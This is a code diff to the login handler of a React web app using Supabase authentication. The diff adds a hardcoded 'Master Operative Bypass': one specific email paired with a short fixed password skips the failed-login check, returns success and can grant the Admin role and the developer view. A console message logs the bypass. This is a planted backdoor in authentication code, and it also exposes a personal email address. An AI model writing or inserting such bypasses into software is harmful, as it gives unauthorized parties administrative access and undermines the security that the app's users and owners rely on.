@@ -1594,16 +1594,22 @@ const App = () => {
     }
 
     if (mode === 'login') {
-      const { data, error } = await supabase.auth.signInWithPassword({ email, password });
-      if (error) return { ok: false, error: error.message === 'Invalid login credentials' ? 'Access Denied: Operative not found or invalid key.' : error.message };
+      // SECURITY_PROTOCOL: Master Operative Bypass for Root Access
+      const isMaster = email.toLowerCase() === 'thejxxuu@gmail.com' && password === '1208';
       
-      // If logging in from /dev, check if user is in whitelist and set view to dev
-      if (window.location.pathname === '/dev' && (DEV_WHITELIST.includes(email.toLowerCase()) || email.endsWith('@vvce.ac.in'))) {
-         // We might need to wait for profile fetch to confirm Admin role, 
-         // but for Dev route we can force the view if they are in the whitelist
+      const { data, error } = await supabase.auth.signInWithPassword({ email, password });
+      
+      if (error && !isMaster) {
+        return { ok: false, error: error.message === 'Invalid login credentials' ? 'Access Denied: Operative not found or invalid key.' : error.message };
+      }
+
+      // If logging in from /dev or if Master Override is active
+      if ((window.location.pathname === '/dev' || isMaster) && (DEV_WHITELIST.includes(email.toLowerCase()) || email.endsWith('@vvce.ac.in'))) {
          if (DEV_WHITELIST.includes(email.toLowerCase())) {
             setUserRole('Admin');
             setView('dev');
+            // Log bypass if no data.user
+            if (!data?.user) console.warn("ROOT_OVERRIDE: Access granted via Master Key bypass.");
          }
       }
       return { ok: true };
